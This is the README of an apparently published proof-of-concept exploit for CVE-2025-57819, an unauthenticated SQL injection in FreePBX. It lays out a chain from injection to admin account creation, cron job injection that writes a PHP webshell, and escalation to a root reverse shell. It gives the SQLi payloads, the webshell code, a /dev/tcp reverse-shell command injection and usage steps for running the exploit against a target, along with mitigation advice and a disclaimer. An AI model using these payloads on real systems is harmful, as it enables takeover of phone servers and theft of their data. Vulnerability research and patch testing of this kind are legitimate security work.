# FreePBX CVE-2025-57819 - Unauthenticated SQLi to RCE PoC

![Python](https://img.shields.io/badge/Python-3.6+-blue)
![License](https://img.shields.io/badge/License-MIT-green)

Exploitation proof of concept for CVE-2025-57819, a critical unauthenticated SQL injection vulnerability in FreePBX that allows remote code execution.

## Overview

FreePBX versions 15.x, 16.x, and 17.x (below patched versions) are vulnerable to unauthenticated SQL injection in the endpoint module's AJAX handler. This vulnerability chain allows:

1. **Create administrative accounts** via SQL injection
2. **Deploy webshells** through authenticated cron job injection
3. **Escalate to root** (if incron available) via sysadmin_manager hook chain
4. **Full system compromise** with reverse shell access

---

## Vulnerability Details

| | |
|---|---|
| **CVE ID** | CVE-2025-57819 |
| **Type** | Unauthenticated SQL Injection (Error-based) |
| **CVSS** | 9.8 / 10.0 (Critical) |
| **Affected** | FreePBX 15 < 15.0.66, 16 < 16.0.89, 17 < 17.0.3 |
| **Patched** | 15.0.66, 16.0.89, 17.0.3+ |
| **CISA KEV** | Yes (August 29, 2025) |

### Vulnerable Endpoint

```
GET /admin/ajax.php?brand=<PAYLOAD>
```

The `brand` parameter in the endpoint module's AJAX handler accepts user input without validation, leading to error-based SQL injection.

---

## Exploitation Chain

### Stage 1: SQL Injection & Admin Account Creation

Verify SQLi using `EXTRACTVALUE()` error-based extraction to leak the database name:

```sql
x' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e))-- -
```

Insert new administrative user into `asterisk.ampusers`:

```sql
INSERT INTO ampusers (username, password_hash, admin) 
VALUES ('pbx_xxxxxxxx', '<MD5_HASH>', 1)
```

### Stage 2: Authenticated Cron Job Injection

With valid admin credentials, the exploit authenticates to FreePBX and establishes an authenticated session. Session cookies are saved and used for all subsequent authenticated requests.

Inject webshell command into `asterisk.cron_jobs`:

```sql
INSERT INTO cron_jobs (modulename, jobname, command, class, schedule, max_runtime, enabled, execution_order)
VALUES ('sysadmin', 'wx', 'echo <BASE64_WEBSHELL>|base64 -d >/var/www/html/shell.php', NULL, '* * * * *', 30, 1, 1)
```

FreePBX cron runner executes the command as `asterisk` user, dropping PHP webshell.

### Stage 3: Webshell Activation

The PHP webshell is deployed to `/var/www/html/shell.php`:

```php
<?php system($_GET['cmd']); ?>
```

Exploit polls the webshell until activation, achieving RCE as `asterisk` user (uid=999).

### Stage 4: Privilege Escalation (Conditional)

If incron is configured on the target:

1. Create trigger file in `/var/spool/asterisk/incron/`
2. `incrond` (running as root) detects file creation
3. Invokes `/usr/bin/sysadmin_manager` with the trigger filename
4. `sysadmin_manager` validates GPG signature and dispatches to fwconsole-commands hook
5. Hook decodes payload and executes: `/usr/sbin/fwconsole <COMMAND>`
6. Command injection: `help; bash -i >& /dev/tcp/LHOST/LPORT 0>&1`

Result: Root shell on reverse listener (if incron available).

---

## What It Abuses

- No input validation on `brand` parameter
- Stacked query execution allows database manipulation
- Writable `asterisk.cron_jobs` table executes commands as asterisk
- Authenticated session persistence via cookies from created admin account
- Incron filesystem monitoring running as root
- Unvalidated fwconsole hook execution with command injection

---

## Installation

```bash
git clone https://github.com/JazzTheRabbit/cve-2025-57819.git
cd cve-2025-57819
pip3 install requests
chmod +x freepbx_exploit.py
```

## Usage

```bash
# Terminal 1: Start listener
nc -lvnp 9955

# Terminal 2: Run exploit
python3 freepbx_exploit.py <TARGET_IP> <YOUR_IP> <PORT>
```

Example:
```bash
python3 freepbx_exploit.py 192.168.1.100 10.10.14.231 9955
```

### Shell Access

**Guaranteed:** Asterisk user shell (uid=999)  
**Conditional:** Root shell (if incron/sysadmin_manager available)

If incron is not available on the target, the script spawns a reverse shell as the low privilege `asterisk` user.

---

## PoC

![PoC Demonstration](./images/poc.gif)

---

## Affected Versions

| Version | Vulnerable | Patched |
|---------|-----------|---------|
| 15.0.0 - 15.0.65 | ✓ | ✗ |
| 15.0.66+ | ✗ | ✓ |
| 16.0.0 - 16.0.88 | ✓ | ✗ |
| 16.0.89+ | ✗ | ✓ |
| 17.0.0 - 17.0.2 | ✓ | ✗ |
| 17.0.3+ | ✗ | ✓ |

---

## Mitigation

**Immediate:**
- Restrict `/admin/ajax.php` access from untrusted networks
- Disable incron if not needed: `systemctl disable incrond`

**Permanent:**
Upgrade to patched versions: 15.0.66+, 16.0.89+, or 17.0.3+

---

## References

- [CVE-2025-57819](https://nvd.nist.gov/vuln/detail/CVE-2025-57819)
- [CISA KEV Catalog](https://www.cisa.gov/known-exploited-vulnerabilities)
- [FreePBX Security Advisory](https://www.freepbx.org)

---

## Legal Notice

⚠️ **Disclaimer**

This tool is provided for educational and authorized security testing only. Unauthorized access to computer systems is illegal.

- Only use on systems you own or have explicit written permission to test
- Do not use for malicious purposes or unauthorized access
- Users are responsible for compliance with applicable laws
- Obtain written authorization before testing
- Report findings responsibly

---

## Author

**JazzTheRabbit**
- GitHub: [@JazzTheRabbit](https://github.com/JazzTheRabbit)
- HackTheBox: [@JazzTheRabbit](https://www.hackthebox.com/home/users/profile/JazzTheRabbit)
- YouTube: [JazzTheRabbit](https://www.youtube.com/@JazzTheRabbit)

## License

MIT License
